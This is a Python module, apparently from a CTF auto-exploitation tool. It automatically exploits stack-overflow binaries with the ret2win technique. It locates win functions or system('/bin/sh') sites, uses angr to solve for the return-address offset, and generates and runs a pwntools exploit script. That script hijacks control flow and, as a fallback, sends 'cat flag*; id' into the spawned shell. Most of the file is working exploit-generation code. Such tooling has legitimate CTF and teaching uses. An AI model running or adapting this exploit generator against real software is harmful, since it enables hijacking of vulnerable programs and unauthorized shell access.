"""Concrete stack-overflow -> win-function exploitation.

1. locate a "win" target (named ``win``/``backdoor``/... or a
   ``system("/bin/sh")`` call site),
2. find the saved-return offset symbolically (angr: first state with a
   fully symbolic instruction pointer) or from Triage's overflow-site
   heuristic,
3. emit a pwntools script, run it through the WSL pwn venv, and report the
   flag / shell output.

x86 / x86-64 ELF get the full concrete treatment. Other architectures
(SPARC / MIPS / PPC / ...) get a ready-to-run script plus the static recon,
since we usually can't execute them here.
"""

from __future__ import annotations

import textwrap
from dataclasses import dataclass, field

from triage_web.analysis import build_known_calls, find_win_functions, overflow_sites
from triage_web.autopwn.runner import extract_flags, run_path, run_script, target_kind
from triage_web.engine import Disassembler
from triage_web.loader import BinaryLoader

try:
    import angr
    import claripy

    HAS_ANGR = True
except ImportError:  # pragma: no cover
    HAS_ANGR = False


@dataclass
class Ret2WinResult:
    ok: bool
    flag: str | None = None
    win: str | None = None
    win_addr: int | None = None
    offset: int | None = None
    script: str = ""
    stdout: bytes = b""
    reason: str = ""
    log: list[str] = field(default_factory=list)


def solve_ret2win(
    path: str,
    *,
    win: str | int | None = None,
    offset: int | None = None,
    timeout: float = 90.0,
) -> Ret2WinResult:
    ldr = BinaryLoader(path)
    log: list[str] = []
    try:
        info = ldr.get_info()
        disasm = _mk_disasm(info)
        win_name, win_addr = _pick_win(ldr, disasm, win)
        if win_addr is None:
            return Ret2WinResult(False, reason='no win function / system("/bin/sh") site found', log=log)
        log.append(f"win target: {win_name} @ {win_addr:#x}")

        if offset is None:
            offset = _find_offset(path, ldr, disasm, log)
        if offset is None:
            return Ret2WinResult(
                False, win=win_name, win_addr=win_addr, reason="could not determine the overflow offset", log=log
            )
        log.append(f"overflow offset: {offset}")

        script = _emit_script(run_path(path), info, win_addr, offset)
        result = Ret2WinResult(ok=False, win=win_name, win_addr=win_addr, offset=offset, script=script, log=log)

        if info["arch"] in ("x86", "x86_64") and target_kind(path) == "elf":
            proc = run_script(script, timeout=timeout)
            result.stdout = proc.stdout + proc.stderr
            flags = extract_flags(result.stdout)
            if flags:
                result.ok, result.flag = True, flags[0]
            elif not proc.runnable:
                result.reason = f"generated the exploit but cannot run it here: {proc.text.strip()[:200]}"
            else:
                result.reason = f"exploit ran but produced no flag (rc={proc.returncode}); output:\n{proc.text[:400]}"
        else:
            result.reason = f"{info['arch']} target — script generated; run it where the binary executes"
        return result
    finally:
        ldr.close()


def _mk_disasm(info) -> Disassembler | None:
    try:
        return Disassembler(arch=info["arch"], bits=info["bits"])
    except Exception:  # pragma: no cover - only if capstone is missing
        return None


def _pick_win(ldr, disasm, want) -> tuple[str | None, int | None]:
    funcs = dict(ldr.get_functions())
    if isinstance(want, int):
        return (f"{want:#x}", want)
    if isinstance(want, str) and want in funcs:
        return (want, funcs[want])

    for f in find_win_functions(ldr):
        return (f["name"], int(f["address"], 16) if isinstance(f["address"], str) else f["address"])

    for name, addr in funcs.items():
        if any(h in name.lower() for h in ("win", "backdoor", "show_flag", "get_flag", "print_flag", "secret")):
            return (name, addr)

    binsh = _find_binsh(ldr)
    if binsh is not None and "system" in {i["name"].split("@")[0] for i in ldr.get_imports()}:
        return ('system("/bin/sh")', binsh)
    return (None, None)


def _find_binsh(ldr) -> int | None:
    raw = bytes(ldr._raw)
    idx = raw.find(b"/bin/sh\x00")
    if idx < 0:
        return None
    for s in ldr.get_sections():
        off, size = s.get("offset", -1), s.get("size", 0)
        if 0 <= off <= idx < off + size and s.get("vaddr"):
            return s["vaddr"] + (idx - off)
    return None


def _find_offset(path, ldr, disasm, log) -> int | None:
    if HAS_ANGR:
        try:
            off = _symbolic_offset(path)
            if off is not None:
                log.append(f"offset via symbolic PC control: {off}")
                return off
        except Exception as exc:  # pragma: no cover - angr edge cases
            log.append(f"symbolic offset failed: {exc}")

    sites = overflow_sites(ldr, disasm, build_known_calls(ldr), ldr.get_info()["bits"] == 64)
    if sites:
        est = sites[0].get("est_offset_to_ret")
        if est:
            log.append(f"offset via overflow-site heuristic: {est}")
            return int(est)
    return None


def _symbolic_offset(path: str) -> int | None:
    proj = angr.Project(path, auto_load_libs=False)
    buf = claripy.BVS("payload", 8 * 400)
    st = proj.factory.full_init_state(
        stdin=angr.SimFileStream(name="stdin", content=buf, has_end=True),
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
        },
    )
    simgr = proj.factory.simulation_manager(st, save_unconstrained=True)
    for _ in range(80):
        if simgr.unconstrained or not simgr.active:
            break
        simgr.step()
    if not simgr.unconstrained:
        return None
    bad = simgr.unconstrained[0]
    want = 0x4242424242424242 if proj.arch.bits == 64 else 0x42424242
    marker = b"\x42" * (proj.arch.bits // 8)
    probe = bad.copy()
    probe.solver.add(bad.regs.pc == want)
    if not probe.solver.satisfiable():
        return None
    payload = probe.solver.eval(buf, cast_to=bytes)
    idx = payload.find(marker)
    return idx if idx >= 0 else None


def _emit_script(path: str, info, win_addr: int, offset: int) -> str:
    arch = {"x86_64": "amd64", "x86": "i386"}.get(info["arch"], info["arch"])
    bits = info["bits"]
    need_align = bits == 64
    body = f'''
        import re, sys
        from pwn import context, process, flat, p{bits}, ROP, ELF

        context.update(arch="{arch}", log_level="warning")
        exe = {path!r}
        OFFSET, WIN = {offset}, {win_addr:#x}

        def attempt(chain):
            p = process(exe)
            try:
                p.sendline(chain)
                try:
                    p.shutdown("send")
                except Exception:
                    pass
                data = p.recvall(timeout=5)
            except EOFError:
                data = b""
            finally:
                p.close()
            return data

        FLAG = re.compile(rb"(flag|FLAG|CTF|pico|HTB|key)\\{{|FLAG-")
        out = attempt(flat({{OFFSET: p{bits}(WIN)}}))
        if not FLAG.search(out) and {need_align}:
            try:
                ret = ROP(ELF(exe, checksec=False)).find_gadget(["ret"])[0]
                out += b"\\n" + attempt(flat({{OFFSET: p{bits}(ret) + p{bits}(WIN)}}))
            except Exception:
                pass
        if not FLAG.search(out):
            p = process(exe)
            p.sendline(flat({{OFFSET: p{bits}(WIN)}}))
            p.sendline(b"cat flag* 2>/dev/null; id")
            try:
                out += b"\\n" + p.recvall(timeout=3)
            except EOFError:
                pass
            p.close()
        sys.stdout.buffer.write(out)
    '''
    return textwrap.dedent(body).strip() + "\n"
